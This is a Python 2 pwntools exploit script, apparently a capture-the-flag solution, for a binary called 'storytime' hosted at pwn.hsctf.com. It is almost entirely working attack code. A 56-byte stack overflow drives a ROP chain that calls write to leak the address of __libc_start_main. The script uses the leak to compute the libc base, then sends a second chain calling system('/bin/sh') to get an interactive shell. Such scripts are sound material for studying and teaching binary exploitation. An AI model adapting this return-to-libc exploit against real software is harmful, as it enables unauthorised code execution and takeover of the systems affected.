#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep

########## EXE CONTEXT ##########
context.update(arch='amd64')
elf = ELF("./storytime")
libc = ELF("libc6_2.23-0ubuntu10_amd64.so")
rop = ROP(elf)
#################################

########## LAUNCH SETTINGS ##########
host = args.HOST or 'pwn.hsctf.com'
port = int(args.PORT or 3333)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)
#######################################

########## GDBSCRIPT ##########
gdbscript = """
break *0x400696
break *0x40062D
continue
""".format(**locals())
###############################

########## FUNCTIONS / GUDGETS ##########
WRITE = elf.plt['write']
CLIMAX = 0x40060E
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
POP_RSI = 0x400701 # pop rsi ; pop r15 ; ret

log.info("write@plt: " + hex(WRITE))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
##########################################


#===========================================================#
#                    EXPLOIT GOES HERE                      #
#===========================================================#

io = start()

sleep(0.5)
print io.recv()

padding = 'A' * 56
pl  = padding
pl += p64(POP_RDI)
pl += p64(0X1)

pl += p64(POP_RSI)
pl += p64(LIBC_START_MAIN)
pl += p64(0x1)

pl += p64(WRITE)

pl += p64(CLIMAX) # read

io.sendline(pl)

data = io.recv()
leak = u64(data[0:6].strip().ljust(8, '\x00'))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

BINSH = next(libc.search("/bin/sh"))
SYSTEM = libc.sym["system"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

pl2  = padding
pl2 += p64(POP_RDI)
pl2 += p64(BINSH)
pl2 += p64(SYSTEM)

io.sendline(pl2)

io.interactive()
io.close()
